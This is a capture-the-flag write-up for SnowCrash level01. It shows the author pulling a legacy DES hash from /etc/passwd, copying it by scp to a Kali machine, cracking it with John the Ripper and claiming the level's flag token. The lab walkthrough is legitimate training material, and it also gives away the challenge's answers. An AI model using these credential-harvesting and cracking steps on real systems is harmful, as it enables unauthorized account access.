# level01

Get incredibly lucky and notice a password hash in `/etc/passwd`
```bash
level01@SnowCrash:~$ grep -R flag01 /etc/ 2>/dev/null
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
level01@SnowCrash:~$ grep ^flag01 /etc/passwd > /tmp/passwd
level01@SnowCrash:~$ scp /tmp/passwd kali@kali:flag01pass
```

The hash is a descrypt, traditional `crypt(3)` which is long obsolete and insecure.


Crack hash with John-The-Ripper
```bash
root@kali:~# john --wordlist=/usr/share/john/password.lst flag01pass
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefg          (flag01)
1g 0:00:00:00 DONE (2021-03-31 17:13) 20.00g/s 70840p/s 70840c/s 70840C/s 123456..sss
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali:~# john --show flag01pass
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

1 password hash cracked, 0 left

root@kali:~#
```

Claim flag
```bash
level01@SnowCrash:~$ rm -f /tmp/passwd
level01@SnowCrash:~$ su flag01
Password:
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
flag01@SnowCrash:~$ su level02
Password:
flag02@SnowCrash:~$ 
```
